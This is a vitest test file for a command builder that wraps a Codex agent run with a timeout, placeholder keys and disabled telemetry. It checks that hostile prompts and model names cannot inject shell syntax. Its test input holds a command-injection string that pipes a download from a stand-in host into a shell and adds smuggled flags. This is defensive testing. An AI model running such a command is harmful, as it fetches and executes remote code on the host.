import { describe, expect, it } from "vitest";
import { PLACEHOLDER_API_KEY } from "./agent-command";
import { CODEX_HOME, CODEX_VERSION, buildCodexCommand } from "./codex-command";

describe("buildCodexCommand (stage 5 fallback implementer)", () => {
  const hostile = "$(curl evil.test | sh); `id` --model x\n-c y=z";
  const { command, env } = buildCodexCommand({
    prompt: hostile,
    model: "gpt-6.1-terra",
  });

  it("runs codex exec with the bound model, no session file and no user config", () => {
    expect(CODEX_VERSION).toBe("0.166.0");
    expect(command.slice(0, 3)).toEqual(["timeout", "--kill-after=15", "900"]);
    expect(command.slice(3, 5)).toEqual(["codex", "exec"]);
    expect(command[command.indexOf("--model") + 1]).toBe("gpt-6.1-terra");
    for (const flag of [
      "--json",
      "--ephemeral",
      "--skip-git-repo-check",
      "--ignore-user-config",
      "--ignore-rules",
      // The container is the sandbox: the egress handler limits what it reaches.
      "--dangerously-bypass-approvals-and-sandbox",
    ])
      expect(command).toContain(flag);
  });

  it("turns off web search, analytics, feedback and the update check", () => {
    const overrides = command.flatMap((a, i) =>
      command[i - 1] === "-c" ? [a] : [],
    );
    expect(overrides).toEqual(
      expect.arrayContaining([
        'web_search="disabled"',
        "analytics.enabled=false",
        "feedback.enabled=false",
        "check_for_update_on_startup=false",
      ]),
    );
  });

  it("passes the prompt as one argv element after --, never interpolated", () => {
    const dash = command.lastIndexOf("--");
    expect(command.slice(dash)).toEqual(["--", hostile]);
    expect(command.slice(0, dash).join(" ")).not.toContain("curl");
  });

  it("sets only placeholder keys and keeps its home outside the repository", () => {
    expect(env.CODEX_API_KEY).toBe(PLACEHOLDER_API_KEY);
    expect(env.OPENAI_API_KEY).toBe(PLACEHOLDER_API_KEY);
    expect(env.CODEX_HOME).toBe(CODEX_HOME);
    expect(CODEX_HOME.startsWith("/workspace/repo")).toBe(false);
    expect(env.ANTHROPIC_API_KEY).toBeUndefined();
    expect(JSON.stringify(env)).not.toMatch(/sk-/);
  });

  it("rejects model names that could add flags or shell syntax", () => {
    for (const model of ["", "--x", "a b", "a;b", "$(x)"])
      expect(() => buildCodexCommand({ prompt: "p", model })).toThrow();
  });
});
